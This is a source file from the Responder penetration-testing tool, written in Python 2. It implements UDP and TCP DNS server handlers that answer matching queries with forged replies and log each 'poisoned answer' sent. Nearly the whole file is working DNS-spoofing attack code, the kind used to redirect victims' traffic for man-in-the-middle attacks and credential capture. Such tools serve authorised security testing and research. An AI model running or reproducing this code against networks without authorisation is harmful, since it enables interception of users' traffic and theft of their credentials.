#!/usr/bin/env python
# This file is part of Responder
# Original work by Laurent Gaffie - Trustwave Holdings
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import re

from packets import DNS_Ans
from SocketServer import BaseRequestHandler
from utils import *

def ParseDNSType(data):
	QueryTypeClass = data[len(data)-4:]

	# If Type A, Class IN, then answer.
	return True if QueryTypeClass == "\x00\x01\x00\x01" else False

# DNS Server class
class DNS(BaseRequestHandler):

	def handle(self):

		# Break out if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None

		try:
			data, soc = self.request

			if ParseDNSType(data) and settings.Config.AnalyzeMode == False:
				buff = DNS_Ans()
				buff.calculate(data)
				soc.sendto(str(buff), self.client_address)

				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				print color("[*] [DNS] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1)

		except Exception:
			pass

# DNS Server TCP Class
class DNSTCP(BaseRequestHandler):

	def handle(self):

		# Break out if we don't want to respond to this host
		if RespondToThisIP(self.client_address[0]) is not True:
			return None
	
		try:
			data = self.request.recv(1024)

			if ParseDNSType(data) and settings.Config.AnalyzeMode == False:
				buff = DNS_Ans()
				buff.calculate(data)
				self.request.send(str(buff))

				ResolveName = re.sub('[^0-9a-zA-Z]+', '.', buff.fields["QuestionName"])
				print color("[*] [DNS-TCP] Poisoned answer sent to: %-15s  Requested name: %s" % (self.client_address[0], ResolveName), 2, 1)

		except Exception:
			pass